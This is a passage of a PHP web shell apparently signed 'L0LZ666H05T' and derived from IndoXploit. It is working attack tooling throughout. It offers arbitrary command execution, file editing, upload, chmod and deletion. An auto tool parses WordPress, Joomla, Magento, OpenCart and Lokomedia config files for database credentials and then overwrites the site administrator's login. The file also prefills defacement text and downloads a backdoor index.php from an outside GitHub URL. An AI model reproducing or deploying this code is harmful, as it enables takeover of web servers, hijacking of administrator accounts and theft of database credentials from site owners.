</form>
<?php
die();
}
			if ($_POST['do'] == 'edit') {
	          if (isset($_POST['submit'])) {
		        @edit($_POST['file'], $_POST['text']);
	        } $text = @htmlspecialchars(@file_get_contents($_POST['file']));
	        ?>
	        <form method="post">
	        	<tr>
	        		<td colspan="5">
	        			<div class="alert alert-primary" role="alert">
            				Rename Filename : <b><?php print $_POST['file'] ?></b> | 
            				Size : <b><?php print @size($_POST['file']) ?></b> | 
            				Permission : <b><?php print @permission($_POST['file'], @perms($_POST['file'])) ?></b> | 
            				Type : <b><?php print @getMime($_POST['file']) ?></b>
            			</div>
	        		</td>
	        	</tr>
	        	<td colspan="5" class="edit">
	        	<textarea class="form-control edit" name="text"><?php print $text ?></textarea></td>
	        	<input type="hidden" name="do" value="edit">
	        	<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
		        <tr><td colspan="5" class="edit">
		        <center>
		        	<input style="width:100%;" type="submit" name="submit" class="btn btn-success">
		        </center></td>
	        </form>
	        <?php
            }
            if ($_POST['do'] == 'renames') {
            	if (isset($_POST['submit'])) {
            		@renames($_POST['file'], $_POST['newname']);
            	}
            	?>
            	<form method="post">
            		<tr>
            			<td colspan="5">
            			<div class="alert alert-primary" role="alert">
            				Rename Filename : <b><?php print $_POST['file'] ?></b> | 
            				Size : <b><?php print @size($_POST['file']) ?></b> | 
            				Permission : <b><?php print @permission($_POST['file'], @perms($_POST['file'])) ?></b> | 
            				Type : <b><?php print @getMime($_POST['file']) ?></b>
            			</div>
            		</td>
            		</tr>
            		<td colspan="4">
            			<input class="form-control" style="width:100%;" type="text" name="newname" value="<?php print $_POST['file'] ?>">
            		</td>
            		<input type="hidden" name="do" value="renames">
	        	    <input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
            		<td>
            			<input style="width:100%;" type="submit" name="submit" class="btn btn-success"> 
            		</td>
            	</form>
            	<?php
            }
            if ($_GET['do'] == 'cmd') {
            	?>
            	<form method="post">
            		<tr>
            			<td colspan="4">
            				<input class="form-control" type="text" name="cmd">
            			</td>
            			<td>
            				<input type="submit" name="submit" class="btn btn-success" style="width:100%;">
            			</td>
            		</tr>
            	</form>
            	<?php
            	if (isset($_POST['submit'])) {
            		?>
            		<tr>
            			<td colspan="5">
            				<textarea class="form-control edit" readonly><?php print @cmd($_POST['cmd']) ?></textarea>
            			</td>
            		</tr>
            		<?php
            		die();
            	}
            }
            if ($_GET['do'] == 'editUser') {
            	if($_POST['hajar']) {
		   if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		//echo "<center>
		//<h1>Auto Edit User Config</h1>
		//<form method='post'>
		//DIR Config: <br>
		//<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		//Set User & Pass: <br>
		//<input type='text' name='user_baru' value='indoxploit' placeholder='user_baru'><br>
		//<input type='text' name='pass_baru' value='indoxploit' placeholder='pass_baru'><br>
		//<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		//</form>
		//</tr>span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		//";
		?>
		<tr>
			<th colspan="5">
				<h2>AUTO EDIT USER CONFIG</h2>
			</th>
		</tr>
		<tr>
			<td colspan="5">
				<div class="alert alert-primary" role="alert">
					<center>
						This tools only work if you running into dir <u>config</u> ( ex : /home/user/public_html/name_config )
					</center>
				</div>
			</td>
		</tr>
		<form method="post">
			<tr>
				<td colspan="5">
					<input class="form-control" type="text" name="config_dir" value="<?php print @cwd() ?>">
				</td>
			</tr>
			<tr>
				<td colspan="5">
					<input class="form-control" type="text" name="user_baru" value="L0LZ666H05T" placeholder="New Username">
				</td>
			</tr>
			<tr>
				<td colspan="5">
					<input class="form-control" type="text" name="pass_baru" value="L0LZ666H05T" placeholder="New Password">
				</td>
			</tr>
			<tr>
				<td colspan="5">
					<input type="submit" name="hajar" class="btn btn-success" style="width:100%;">
				</td>
			</tr>
		</form>
		<?php
	}
}
            if ($_GET['do'] == 'chmods') {
            	if (isset($_POST['submit'])) {
            		@chmods($_GET['file'], $_POST['mode']);
            	}
            	?>
            	<form method="post">
            		<tr>
            			<td colspan="5">
            				<div class="alert alert-primary" role="alert">
            					Change Filename : <b><u><?php print $_GET['file'] ?></u></b>
            				</div>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="form-control" type="text" name="mode" value="<?php print @substr(@sprintf('%o', @fileperms($_GET['file'])), -4) ?>">
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
            			</td>
            		</tr>
            	</form>
            	<?php
            }
            if ($_GET['do'] == 'makefile') {
            	if (isset($_POST['submit'])) {
            		if ($_POST['type'] == 'file') {
            			@makefile($_POST['filename'], $_POST['text']);
            		}
            		if ($_POST['type'] == 'dir') {
            			@makedir($_POST['filename']);
            		}
            	}
            	?>
            	<tr>
            		<th colspan="5">
            			<h2>ADD NEW FILE & DIR</h2>
            		</th>
            	</tr>
            	<form method="post">
            		<tr>
            			<td colspan="5">
            				<center>
            				<input type="radio" name="type" value="file" checked> file 
            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
            				<input type="radio" name="type" value="dir"> dir 
            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
            			    </center>  
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<center>If you want create <b><u>dir</u></b> please empty the text</center>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="form-control" type="text" name="filename" placeholder="filename/dir">
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<textarea class="form-control edit" name="text">HACKED BY L0LZ666H05T</textarea>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="btn btn-success" style="width:100%;" type="submit" name="submit">
            			</td>
            		</tr>
            	</form>
            	<?php
            	die();
            }
            if ($_GET['do'] == 'upload') {
            	if (isset($_POST['submit'])) {
            		if ($_POST['type'] == 'biasa') {
            			if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            				?>
		                    <div class="alert alert-success" role="alert">
		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Has Been Uploaded !
		                    </div>
		                    <?php
            			} else {
            				?>
		                    <div class="alert alert-danger" role="alert">
		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Cannot Uploaded !
		                    </div>
		                    <?php
            			}
            		}
            		if ($_POST['type'] == 'home') {
            			$home = $_SERVER['DOCUMENT_ROOT'];
            			if (@copy($_FILES['file']['tmp_name'], $home.SEP.$_FILES['file']['name'])) {
            				?>
		                    <div class="alert alert-success" role="alert">
		                    	This File <b><u><a href="http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>">
		                    		http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>
		                    	</a></u></b> Has Been Uploaded !
		                    </div>
		                    <?php
            			} else {
            				?>
            				<div class="alert alert-danger" role="alert">
            					This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Cannot Uploaded !
            				</div>
            				<?php
            			}
            		}
            	}
            	?>
            	<tr>
            		<th colspan="5">
            			<h2>UPLOAD FILE</h2>
            		</th>
            	</tr>
            	<form method="post" enctype="multipart/form-data">
            		<tr>
            			<td colspan="5">
            				<center>
            				<input type="radio" name="type" value="biasa" checked> biasa
            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
            				<input type="radio" name="type" value="home"> home_root
            				( <?php print @permission($_SERVER['DOCUMENT_ROOT'], @perms($_SERVER['DOCUMENT_ROOT'])) ?> )
            			    </center>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<div class="input-group mb-3">
                           <div class="input-group-prepend">
                             <input class="btn btn-success" name="submit" type="submit" value="UPLOAD">
                           </div>
                           <div class="custom-file">
                             <input type="file" name="file" class="custom-file-input" id="inputGroupFile03">
                             <label class="custom-file-label" for="inputGroupFile03">Choose file . . .</label>
                           </div>
                         </div>
            			</td>
            		</tr>
            	</form>
            	<?php
            }
			?>
		</tr>
    	<tr>
    		<th>Filename</th>
    		<th>Size</th>
    		<th>Permission</th>
    		<th colspan="2">Action</th>
    	</tr>
    	<?php
    	$scandir = @scandir(@cwd());
    	foreach ($scandir as $dir) {
    		if (!is_dir($dir)) continue;
    		if ($dir === '.' || $dir === '..') continue;
    		?>
    		<tr>
    			<td>
    				<img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon"> 
    				 <a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
    			</td>
    			<td><center>--</center></td>
    			<td><?php print @permission($dir, @perms($dir)) ?> 
                <div class="permission">
                ( <a href="?dir=<?php print @cwd() ?>&do=chmods&file=<?php print $dir ?>">
    			<?php print @substr(@sprintf('%o', @fileperms($dir)), -4) ?>
    			</a> )
                </div>
                </td>
    			<td>
    				<center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    				</td>
    					<input type="hidden" name="file" value="<?php print $dir ?>">
    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
    				</form>
    			</center>
    			</td>
    		</tr> 
    		<?php
    	}
    	foreach ($scandir as $file) {
    		if (!is_file($file)) continue;
    		?>
    		<tr>
    			<td>
    				<img class="icon" src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png">
    				 <?php print $file ?>
    			</td>
    			<td>
    				<center><?php print @size($file) ?></center>
    			</td>
    			<td><?php print @permission($file, @perms($file)) ?> 
    		    <div class="permission">
    		    ( <a href="?dir=<?php print @cwd() ?>&do=chmods&file=<?php print $file ?>">
    			<?php print @substr(@sprintf('%o', @fileperms($file)), -4) ?>
    			</a> )
    		    </div>
    		   </td>
    			<td><center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
    						<option value="edit">Edit</option>
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    				</td>
    					<input type="hidden" name="file" value="<?php print $file ?>">
    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
    				</form>
    			</td>
    		</tr>
    		<?php
    	}
    	?>
    	<form method="post">
    	<tr>
    		<th colspan="5">
    		<?php
    		$link = "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
            @createTools("adminer", "https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php");
            @createTools("index", "https://raw.githubusercontent.com/l0lz666h05t/backdoor/master/index.php");
    		?>
    		<select class="form-control" id="action" onchange="if (this.value) window.open(this.value);">
    			<option>Choose . . .</option>
    			<option value="<?php print $link ?>=adminer">Adminer</option>
    			<option value="<?php print $link ?>=index">index.php</option>
    		</select>
    		<noscript>
    				<input type="submit" value="Execute" style="width:100%;" class="btn btn-success">
    			</noscript>
    		</th>
    	</tr>
        </form>
    	<tr>
    		<th colspan="5">
    			&copy; <?php print @date("Y") ?> - L0LZ666H05T 
    		</th>
    	</tr>
    </table>
	</div>
</center>
</body>
</html>
